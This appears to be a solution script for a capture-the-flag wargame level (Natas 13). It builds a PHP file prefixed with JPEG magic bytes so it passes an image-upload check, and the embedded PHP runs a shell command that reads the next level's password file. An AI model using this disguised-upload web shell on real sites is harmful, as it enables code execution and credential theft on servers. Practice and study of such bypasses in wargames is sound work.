jpeg_magic_number = b"\xff\xd8\xff\xe0"
with open("./natas13.php", "wb") as f:
    f.write(jpeg_magic_number)

php_code = \
"""
<?php

    exec("cat /etc/natas_webpass/natas14", $output);
    print_r($output[0]);

?>
"""
with open("./natas13.php", "a") as f:
    f.write(php_code)